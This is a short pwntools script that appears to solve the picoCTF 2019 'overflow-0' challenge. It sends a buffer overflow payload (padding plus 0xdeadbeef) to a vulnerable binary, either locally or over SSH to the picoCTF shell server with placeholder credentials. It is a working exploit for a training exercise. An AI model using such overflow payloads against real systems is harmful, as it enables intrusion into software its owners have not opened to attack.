from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = '/problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7/vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process([BINARY,'a'*(128+10)+p32(0xdeadbeef)], stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='Username', password="Password")
  sh = s.process(['vuln','a'*(128+4)+p32(0xdeadbeef)], cwd='/problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7')
  REMOTE = True


sh.interactive()